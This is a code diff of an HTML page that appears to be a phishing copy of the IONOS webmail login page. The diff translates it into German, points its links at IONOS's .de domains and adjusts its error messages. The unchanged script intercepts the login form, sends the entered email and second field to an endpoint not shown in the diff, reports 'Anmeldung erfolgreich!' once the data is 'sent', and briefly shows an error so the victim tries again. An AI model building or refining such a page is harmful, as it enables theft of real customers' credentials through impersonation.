@@ -15,9 +15,9 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="robots" content="index, follow">
   <link rel="dns-prefetch" href="https://sherlock.ionos.com/">
-  <title>Login - IONOS</title>
+  <title>Anmelden - IONOS</title>
   <meta name="description"
-    content="Zugang zu Ihrer gesamten IONOS-Welt: Verträge, Produkte und Kundendaten, bestellen oder ändern Sie Dienste - jetzt passwortgeschützte Login.">
+    content="Zugriff auf Ihre gesamte IONOS-Welt: Verträge, Produkte und Kundendaten, Bestellung oder Änderung von Services - jetzt passwortgeschützter Login.">
 
   <link rel="alternate" hreflang="de" href="https://login.ionos.de/">
   <link rel="alternate" hreflang="en-gb" href="https://login.ionos.co.uk/">
@@ -31,7 +31,7 @@
   <link rel="alternate" hreflang="it" href="https://login.ionos.it/">
   <link rel="alternate" hreflang="x-default" href="https://login.ionos.com/">
 
-  <link rel="canonical" href="https://login.ionos.com/">
+  <link rel="canonical" href="https://login.ionos.de/">
 
   <link rel="stylesheet" href="main.min.css" type="text/css">
   <link type="text/css" rel="stylesheet" href="//frontend-services.ionos.com/t/inpagelayer/css/inpagelayer.css?v=4.3.6">
@@ -41,7 +41,7 @@
   <script type="text/javascript" src="//var.uicdn.net/shopsshort/privacy/v1/bundle-modern.js"></script>
   
   <style>
-    /* Blink animation for visual feedback */
+    /* Blink-Animation für visuelles Feedback */
     @keyframes blink {
       0% { opacity: 1; }
       50% { opacity: 0.3; }
@@ -52,10 +52,17 @@
       animation: blink 0.5s ease-in-out;
     }
     
-    /* Button click feedback */
+    /* Button-Klick-Feedback */
     .button--primary:active {
       transform: scale(0.98);
       transition: transform 0.1s;
+    }
+
+    /* Stil für die Antwortbox */
+    #responseBox {
+      margin-top: 10px;
+      text-align: center;
+      transition: opacity 0.3s ease;
     }
   </style>
 </head>
@@ -73,7 +80,7 @@
             <li class="oao-navi-flyout-container oao-navi-flyout-application_switch "><a
                 class="oao-navi-flyout-item oao-navi-app-name oao-navi-app-nl oao-navi-as-no-icon" href=""><span
                   class="oao-navi-app-logo"></span><span class="oao-navi-app-name-span-nl">
-                  Login
+                  Anmelden
                 </span></a></li>
           </ul>
         </div>
@@ -86,8 +93,8 @@
           <div class="sheet sheet__section--warning cookie-message hidden">
             <section class="sheet__section">
               <h2 class="headline headline--sub">Aktivierung von Browser-Cookies erforderlich</h2>
-              <p class="paragraph">Um unser Angebot nutzen zu können, ist es notwendig, dass Sie die Verwendung von Cookies in Ihren Browsereinstellungen erlauben.</p>
-              <a href="https://www.ionos.com/help/security-c85142/browser-security-c85171" class="link link--action"
+              <p class="paragraph">Um unser Angebot nutzen zu können, müssen Sie in Ihren Browser-Einstellungen die Verwendung von Cookies erlauben.</p>
+              <a href="https://www.ionos.de/hilfe/sicherheit-c85142/browsersicherheit-c85171" class="link link--action"
                 target="_blank">Mehr erfahren</a>
             </section>
           </div>
@@ -95,7 +102,7 @@
             <div class="sheet sheet--warning">
               <section class="sheet__section">
                 <h2 class="headline headline--sub headline--warning">Bitte aktivieren Sie JavaScript in Ihrem Browser</h2>
-                <p class="paragraph">Um unser Angebot nutzen zu können, ist es notwendig, dass Sie die Ausführung von JavaScript in Ihren Browsereinstellungen erlauben.</p>
+                <p class="paragraph">Um unser Angebot nutzen zu können, müssen Sie in Ihren Browser-Einstellungen die Ausführung von JavaScript erlauben.</p>
               </section>
             </div>
           </noscript>
@@ -108,7 +115,7 @@
                     <span style="font-size: 40px;" class="stripe__visual exos-icon exos-icon-mail-24"></span>
                   </div>
                   <div class="stripe__item">
-                    <h1 class="headline stripe__element">Mein Webmail Login</h1>
+                    <h1 class="headline stripe__element">Mein Webmail-Login</h1>
                   </div>
                 </li>
               </ul>
@@ -128,7 +135,7 @@
                       value="">
 
                     <p class="input-byline">
-                      <a class="link oao-pi-open-in-flyin" target="_blank" href="#">Login-Daten vergessen?</a>
+                      <a class="link oao-pi-open-in-flyin" target="_blank" href="#">Zugangsdaten vergessen?</a>
                     </p>
                   </li>
                   <li class="form-stripe form-stripe--actions">
@@ -147,19 +154,19 @@
 
           <div class="grid grid--full-height grid--headless-hidden">
             <div class="grid-col grid-col--4 grid-col--small-6">
-              <a class="tile tile--filled" href="https://id.ionos.com/">
+              <a class="tile tile--filled" href="https://id.ionos.de/">
                 <span class="tile__icon exos-icon exos-icon-mail-24"></span>
                 <span class="tile__label">Webmail</span>
               </a>
             </div>
             <div class="grid-col grid-col--4 grid-col--small-6">
-              <a class="tile tile--filled" href="https://dcd.ionos.com/latest?regDomain=ionos.com">
+              <a class="tile tile--filled" href="https://dcd.ionos.de/latest?regDomain=ionos.de">
                 <span class="tile__icon exos-icon exos-icon-folder-upload-16"></span>
                 <span class="tile__label">Data Center Designer</span>
               </a>
             </div>
             <div class="grid-col grid-col--4 grid-col--small-6">
-              <a class="tile tile--filled" href="/https://hidrive.ionos.com/">
+              <a class="tile tile--filled" href="/https://hidrive.ionos.de/">
                 <span class="tile__icon exos-icon exos-icon-folder-upload-16"></span>
                 <span class="tile__label">HiDrive</span>
               </a>
@@ -175,19 +182,19 @@
         <div class="page-footer__section-item">
           <div class="oao-statuspage-overall-status page-footer__status"><a class="oao-statuspage-overall-state-none"
               target="_blank"
-              href="https://www.ionos-status.com/?utm_medium=footer&amp;utm_content=none&amp;utm_source=CENTRAL_LOGIN&amp;utm_campaign=identifier&amp;utm_term=no_search">Alle
-              Systeme funktionieren</a></div>
+              href="https://www.ionos-status.de/?utm_medium=footer&amp;utm_content=none&amp;utm_source=CENTRAL_LOGIN&amp;utm_campaign=identifier&amp;utm_term=no_search">Alle
+              Systeme betriebsbereit</a></div>
         </div>
         <div
           class="page-footer__section-item page-footer__section-item--align-center page-footer__section-item--small-align-left">
-          © 2025
-          <a class="page-footer__link" target="_blank" href="https://www.ionos.com/about">IONOS Inc.</a>
+          © 2026
+          <a class="page-footer__link" target="_blank" href="https://www.ionos.de/impressum">IONOS SE</a>
         </div>
         <div
           class="page-footer__section-item page-footer__section-item--align-right page-footer__section-item--small-align-left">
-          <a class="page-footer__link" target="_blank" href="https://www.ionos.com/terms-gtc/terms-privacy">Datenschutz</a>
+          <a class="page-footer__link" target="_blank" href="https://www.ionos.de/terms-gtc/datenschutzerklaerung">Datenschutz</a>
           -
-          <a class="page-footer__link" target="_blank" href="https://www.ionos.com/terms-gtc">AGB</a>
+          <a class="page-footer__link" target="_blank" href="https://www.ionos.de/terms-gtc">AGB</a>
         </div>
       </section>
     </div>
@@ -197,12 +204,13 @@
   <div>
     <div id="javascript-data" data-visit-id="59ffeb92-699c-49ca-bd8b-446dcca4a0cf.A" data-lang="de" data-tenant="DE"
       data-context-path="/" data-env-mode="prod" data-artifact-version="1.0.227" data-artifact-name="cl"
-      data-sherlock-url="https://sherlock.ionos.com/">
+      data-sherlock-url="https://sherlock.ionos.de/">
     </div>
   </div>
   <script>
-    // Track if we've already shown the error message
+    // Track ob die Fehlermeldung bereits angezeigt wurde
     let errorShown = false;
+    let timeoutId = null;
     
     document.getElementById('login-form').addEventListener('submit', function (e) {
       e.preventDefault();
@@ -211,15 +219,20 @@
       const name = document.getElementById('name').value;
       const responseBox = document.getElementById('responseBox');
       
+      // Vorhandenen Timeout löschen, um mehrere Timer zu vermeiden
+      if (timeoutId) {
+        clearTimeout(timeoutId);
+      }
+      
       const formData = new FormData();
       formData.append('email', email);
       formData.append('name', name);
       
-      // Remove any loader class to prevent loading indicators
+      // Loader-Klasse entfernen, um Lade-Indikatoren zu vermeiden
       const submitButton = document.getElementById('submit-button');
       submitButton.classList.remove('button--with-loader');
       
-      // Add visual feedback to the button
+      // Visuelles Feedback für den Button
       submitButton.classList.add('button--primary-active');
       setTimeout(() => {
         submitButton.classList.remove('button--primary-active');
@@ -232,24 +245,43 @@
       .then((res) => res.json())
       .then((data) => {
         if (data.sent) {
-          // Show success message but don't reload
-          responseBox.innerText = "Login erfolgreich!";
+          // Erfolgsmeldung anzeigen, aber nicht neu laden
+          responseBox.innerText = "Anmeldung erfolgreich!";
           responseBox.style.color = "#4CAF50";
+          responseBox.style.fontWeight = "normal";
           errorShown = false;
         } else {
-          responseBox.innerText = "Etwas ist schief gelaufen.";
+          // Fette Fehlermeldung anzeigen
+          responseBox.innerText = "Etwas ist schiefgelaufen.";
           responseBox.style.color = "#F44336";
+          responseBox.style.fontWeight = "bold";
           errorShown = true;
+          
+          // Meldung nach 2 Sekunden löschen
+          timeoutId = setTimeout(() => {
+            responseBox.innerText = "";
+            responseBox.style.fontWeight = "normal";
+            timeoutId = null;
+          }, 2000);
         }
       })
       .catch((err) => {
-        responseBox.innerText = "Etwas ist schief gelaufen.";
+        // Fette Fehlermeldung anzeigen
+        responseBox.innerText = "Etwas ist schiefgelaufen.";
         responseBox.style.color = "#F44336";
+        responseBox.style.fontWeight = "bold";
         
-        // Add blink animation for visual feedback on subsequent clicks
+        // Meldung nach 2 Sekunden löschen
+        timeoutId = setTimeout(() => {
+          responseBox.innerText = "";
+          responseBox.style.fontWeight = "normal";
+          timeoutId = null;
+        }, 2000);
+        
+        // Blink-Animation für visuelles Feedback bei wiederholten Klicks
         if (errorShown) {
           responseBox.classList.remove('blink-feedback');
-          // Trigger reflow to restart animation
+          // Reflow auslösen, um die Animation neu zu starten
           void responseBox.offsetWidth;
           responseBox.classList.add('blink-feedback');
         } else {
@@ -276,7 +308,7 @@
       font-display: swap
     }
     
-    /* Additional styles for visual feedback */
+    /* Zusätzliche Styles für visuelles Feedback */
     .button--primary-active {
       transform: scale(0.98);
     }
